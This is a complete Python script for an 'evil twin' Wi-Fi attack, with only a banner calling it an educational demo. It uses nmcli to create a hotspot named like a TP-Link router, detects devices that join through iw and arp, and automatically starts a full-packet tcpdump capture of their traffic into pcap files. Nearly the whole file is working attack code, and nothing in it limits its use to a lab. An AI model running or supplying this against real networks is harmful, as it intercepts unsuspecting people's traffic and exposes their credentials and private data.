#!/usr/bin/env python3

import subprocess
import time
import datetime
import sys
import os
import signal

# Configuration
INTERFACE = "wlan0"                    # Change if your WiFi interface is different (check with nmcli device)
SSID = "TPLink_28"                     # Change as needed
PASSWORD = "03425206"                  # Change as needed
PCAP_DIR = "./captures"
CHECK_INTERVAL = 5                     # seconds between checks

# Global variables for cleanup
tcpdump_process = None
hotspot_active = False

def run_command(cmd, check=True):
    try:
        result = subprocess.run(cmd, shell=False, capture_output=True, text=True)
        if check and result.returncode != 0:
            print(f"Command failed: {' '.join(cmd)}")
            print(result.stderr)
        return result
    except Exception as e:
        print(f"Error running command: {e}")
        return None

def setup_hotspot():
    global hotspot_active
    print(f"Setting up hotspot on {INTERFACE} with SSID: {SSID}")
    
    # Bring down any existing hotspot connection
    run_command(["nmcli", "connection", "down", "hotspot"], check=False)
    run_command(["nmcli", "connection", "delete", "hotspot"], check=False)
    
    # Create and activate the hotspot
    cmd = [
        "nmcli", "device", "wifi", "hotspot",
        "ifname", INTERFACE,
        "ssid", SSID,
        "password", PASSWORD
    ]
    
    result = run_command(cmd)
    if result and result.returncode == 0:
        print("Hotspot activated successfully.")
        hotspot_active = True
        return True
    else:
        print("Failed to create hotspot. Try running with sudo or check if AP mode is supported.")
        return False

def get_connected_clients():
    """Return list of (MAC, IP) for currently connected clients using arp and iw."""
    clients = []
    
    # Get associated stations via iw (MAC addresses)
    try:
        iw_out = subprocess.check_output(["iw", "dev", INTERFACE, "station", "dump"], text=True)
        macs = []
        for line in iw_out.splitlines():
            if "Station" in line:
                mac = line.split()[1]
                macs.append(mac)
        
        # Get IP-MAC mapping from arp table
        arp_out = subprocess.check_output(["arp", "-n"], text=True)
        for mac in macs:
            for line in arp_out.splitlines():
                if mac.lower() in line.lower():
                    parts = line.split()
                    if len(parts) >= 3:
                        ip = parts[0]
                        clients.append((mac, ip))
                    break
    except Exception:
        pass  # Fail silently if tools not available
    
    return clients

def start_packet_capture():
    global tcpdump_process
    if tcpdump_process and tcpdump_process.poll() is None:
        return  # Already running
    
    os.makedirs(PCAP_DIR, exist_ok=True)
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    pcap_file = os.path.join(PCAP_DIR, f"evil_twin_{timestamp}.pcap")
    
    print(f"Starting packet capture to: {pcap_file}")
    
    # tcpdump command: capture on the interface, full packets, write to file
    tcpdump_cmd = [
        "tcpdump", "-i", INTERFACE,
        "-s0", "-w", pcap_file,
        "-n"   # no name resolution
    ]
    
    try:
        tcpdump_process = subprocess.Popen(tcpdump_cmd)
        print(f"tcpdump started (PID: {tcpdump_process.pid}). Press Ctrl+C to stop everything.")
    except FileNotFoundError:
        print("tcpdump not found. Install with: sudo apt install tcpdump")
    except Exception as e:
        print(f"Failed to start tcpdump: {e}")

def stop_packet_capture():
    global tcpdump_process
    if tcpdump_process and tcpdump_process.poll() is None:
        print("Stopping packet capture...")
        tcpdump_process.terminate()
        try:
            tcpdump_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            tcpdump_process.kill()
        tcpdump_process = None

def cleanup(signal_received=None, frame=None):
    print("\nCleaning up...")
    stop_packet_capture()
    if hotspot_active:
        print("Deactivating hotspot...")
        run_command(["nmcli", "connection", "down", "hotspot"], check=False)
    print("Script terminated.")
    sys.exit(0)

def main():
    global tcpdump_process
    
    if os.geteuid() != 0:
        print("This script must be run as root (sudo).")
        sys.exit(1)
    
    # Setup signal handler for clean exit (Ctrl+C)
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    
    print("=== Evil Twin Sniffer (Educational Demo) ===")
    print(f"Interface: {INTERFACE} | SSID: {SSID}")
    
    if not setup_hotspot():
        sys.exit(1)
    
    print("Monitoring for new client connections...")
    print("When a device connects, packet capture will start automatically.")
    print(f"Captures will be saved in ./{PCAP_DIR}/")
    
    previous_clients = set()
    
    try:
        while True:
            current_clients = get_connected_clients()
            current_set = {(mac, ip) for mac, ip in current_clients}
            
            # Detect new clients
            new_clients = current_set - previous_clients
            for mac, ip in new_clients:
                print(f"New device connected -> MAC: {mac} | IP: {ip}")
                start_packet_capture()
            
            previous_clients = current_set
            
            # If no clients but capture is running, you may want to keep it running anyway
            # (uncomment next line if you prefer to stop when no clients)
            # if not current_clients and tcpdump_process and tcpdump_process.poll() is None:
            #     stop_packet_capture()
            
            time.sleep(CHECK_INTERVAL)
            
    except KeyboardInterrupt:
        cleanup()

if __name__ == "__main__":
    main()